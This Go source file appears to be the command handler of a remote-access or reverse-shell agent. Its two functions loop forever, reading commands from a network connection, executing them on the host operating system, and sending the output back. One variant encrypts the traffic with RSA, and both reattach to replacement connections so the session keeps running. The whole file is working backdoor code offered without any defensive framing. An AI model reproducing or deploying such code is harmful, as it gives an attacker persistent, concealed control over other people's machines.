package packages

import (
	"fmt"
	"net"
	"strings"
	"time"
)

func Handler(conn *net.Conn, OS_info string, conn_update <-chan *net.Conn) {
	defer (*conn).Close() // Defer close the most recent connection

	// Infinite loop to handle receiving and executing commands
	for {
		// Receive updated connection from the channel if available
		select {
		case updated, ok := <-conn_update:
			if ok {
				*conn = *updated
			}
		default:
			// Do nothing if there's no connection update
		}

		// Buffer to store incoming command
		var buf []byte = make([]byte, 1024)

		// Read command from the client
		n, err := (*conn).Read(buf)
		if err != nil {
			time.Sleep(1 * time.Second) // Prevent high CPU usage
			continue
		}

		// Extract the command from the buffer
		var command string = string(buf[:n])
		if len(command) == 0 {
			time.Sleep(1 * time.Second) // Prevent high CPU usage
			continue
		}

		// Execute the command
		var output string = Execute_on_OS(OS_info, command)
		var formatted_output string = strings.TrimSpace(output)
		if len(formatted_output) == 0 {
			formatted_output = "Empty output"
		}
		_, err = (*conn).Write([]byte(formatted_output))

		// Incase connection issues occur just before the response is sent
		if err != nil {
			// Receive updated connection from the channel if available
			select {
			case updated, ok := <-conn_update:

				if ok {
					*conn = *updated
					// Send response, if another error occurs move onto next iteration
					_, err = (*conn).Write([]byte(formatted_output))
					if err != nil { // Do nothing if another error occurs
						continue
					}
				}

			default:
				// Do nothing if there's no connection update
				continue
			}
		}
	}
}

func Handler_RSA(conn *net.Conn, OS_info string, private_key string, public_key string, conn_update <-chan *net.Conn) {
	defer (*conn).Close() // Defer close the most recent connection

	// Infinite loop to handle receiving and executing commands
	for {
		// Receive updated connection from the channel if available
		select {
		case updated, ok := <-conn_update:
			if ok {
				*conn = *updated
			}
		default:
			// Do nothing if there's no connection update
		}

		// Buffer to store incoming command
		var buf []byte = make([]byte, 1024)

		// Read command from the client
		n, err := (*conn).Read(buf)
		if err != nil {
			continue
		}

		// Extract the command from the buffer and decrypt it
		var encrypted_command string = string(buf[:n])
		command, err := DecryptMessageRSA(encrypted_command, private_key)
		if err != nil {
			fmt.Println("Error decrypting command:", err)
			continue
		}

		if len(command) == 0 {
			time.Sleep(1 * time.Second) // Prevent high CPU usage
			continue
		}

		// Execute the command
		var output string = Execute_on_OS(OS_info, command)
		var formatted_output string = strings.TrimSpace(output)
		if len(formatted_output) == 0 {
			formatted_output = "Empty output"
		}

		// Encrypt and send the output back to the client
		encrypted_output, err := EncryptMessageRSA(formatted_output, public_key)
		if err != nil {
			fmt.Println("Error encrypting output:", err)
			continue
		}
		_, err = (*conn).Write([]byte(encrypted_output))

		// Incase connection issues occur just before the response is sent
		if err != nil {
			// Receive updated connection from the channel if available
			select {
			case updated, ok := <-conn_update:

				if ok {
					*conn = *updated
					// Send response, if another error occurs move onto next iteration
					_, err = (*conn).Write([]byte(encrypted_output))
					if err != nil { // Do nothing if another error occurs
						continue
					}
				}

			default:
				// Do nothing if there's no connection update
				continue
			}
		}
	}
}
